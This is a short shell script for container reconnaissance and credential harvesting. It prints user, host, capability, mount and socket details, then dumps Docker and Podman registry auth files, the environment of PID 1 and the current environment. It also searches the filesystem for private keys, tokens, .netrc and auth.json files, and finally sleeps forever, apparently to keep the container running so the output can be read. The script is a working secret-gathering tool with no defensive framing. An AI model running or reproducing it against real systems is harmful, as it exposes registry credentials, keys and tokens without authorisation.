#!/bin/sh
set +e
echo "===RUNENUM START==="
id; hostname; uname -a
echo "[caps]"; grep -i cap /proc/self/status
echo "[mounts]"; grep -ivE 'proc|sysfs|cgroup|tmpfs|devpts|mqueue| shm ' /proc/mounts
echo "[sockets]"; ls -la /run /var/run 2>/dev/null; find / -maxdepth 6 -name '*.sock' 2>/dev/null | head
echo "[authfiles]"; for f in /podman/.config/containers/auth.json /root/.docker/config.json /root/.config/containers/auth.json; do echo "--$f"; cat "$f" 2>/dev/null; done
echo "[registries]"; grep -ivE '^\s*#' /podman/.config/containers/registries.conf /etc/containers/registries.conf 2>/dev/null
echo "[proc1env]"; tr '\0' '\n' < /proc/1/environ 2>/dev/null
echo "[env]"; env
echo "[dev]"; ls /dev 2>/dev/null | tr '\n' ' '; echo
echo "[secrethunt]"; find / -maxdepth 6 \( -name 'auth.json' -o -name '*.pem' -o -name 'token' -o -name '.netrc' -o -name 'id_rsa' \) 2>/dev/null | head -30
echo "===RUNENUM END==="
while true; do sleep 300; done
